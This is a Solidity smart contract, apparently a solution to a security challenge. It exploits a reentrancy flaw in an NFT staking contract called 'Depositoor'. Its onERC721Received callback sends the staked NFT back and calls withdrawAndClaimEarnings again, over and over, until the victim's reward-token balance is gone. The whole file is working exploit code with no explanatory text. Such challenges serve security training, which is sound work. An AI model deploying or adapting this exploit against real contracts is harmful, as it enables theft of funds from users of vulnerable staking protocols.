// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

interface IDepositoor {
    function nft() external returns (IERC721);

    function rewardToken() external returns (IERC20);

    function withdrawAndClaimEarnings(uint256 _tokenId) external;
}

contract RewardTokenAttacker is IERC721Receiver {
    IERC721 nft;
    IERC20 rewardToken;
    IDepositoor depositoor;
    uint256 tokenId;

    function stake(address _depositoor, uint256 _tokenId) public {
        depositoor = IDepositoor(_depositoor);
        nft = depositoor.nft();
        rewardToken = depositoor.rewardToken();

        require(nft.ownerOf(_tokenId) == address(this), "token not owned");
        tokenId = _tokenId;
        nft.safeTransferFrom(address(this), address(depositoor), tokenId);
    }

    function attack() public {
        depositoor.withdrawAndClaimEarnings(tokenId);
    }

    function onERC721Received(
        address /* operator */,
        address from,
        uint256 _tokenId,
        bytes calldata /* data */
    ) external override returns (bytes4) {
        require(_tokenId == tokenId, "not the target token");
        require(from == address(depositoor), "not the victim");
        require(nft.ownerOf(tokenId) == address(this), "token not owned");
        if (rewardToken.balanceOf(address(depositoor)) > 0) {
            nft.transferFrom(address(this), address(depositoor), tokenId);
            depositoor.withdrawAndClaimEarnings(tokenId);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
